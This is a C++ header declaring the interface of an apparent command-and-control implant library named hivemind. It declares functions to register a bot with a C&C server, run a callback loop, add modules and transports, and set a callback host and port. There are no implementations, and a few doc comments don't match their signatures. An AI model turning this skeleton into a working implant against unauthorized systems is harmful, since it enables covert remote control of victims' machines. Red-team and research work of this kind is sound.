#ifndef HIVEMIND_IMPLANTFRAMEWORK_INCLUDE_HIVEMIND_H_
#define HIVEMIND_IMPLANTFRAMEWORK_INCLUDE_HIVEMIND_H_
#include <string>

namespace hivemind_lib {
/**
 * @brief Initialize the library.
 * @return Status.
 */
void Init();

/**
 * @brief Register the bot with the C&C server.
 * @param info The information needed to connect to the C&C.
 */
void RegisterBot();

/**
 * @brief Start the loop calling to the C&C.
 */
void BeginComms();

/**
 * @brief Add a module to the bot.
 * @param mod Module to add.
 */
void AddModule(const std::string& mod);

/**
 * @brief Add a transport to the bot.
 * @param transport Transport to add.
 */
void AddTransport(const std::string& transport);

/**
 * @brief Initialize the communication method.
 * @param hostname The host to call back to.
 * @param port The port to call back to.
 * @return Status.
 */
void InitComms(const std::string& hostname, const std::string &port);

}
#endif
